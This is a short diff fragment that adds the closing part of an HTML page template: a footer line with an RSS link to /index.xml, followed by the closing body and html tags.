+    / <a href="/index.xml" target="_blank">RSS</a>
+  </p>
+</footer>
+
+
+</body>
+
+</html>
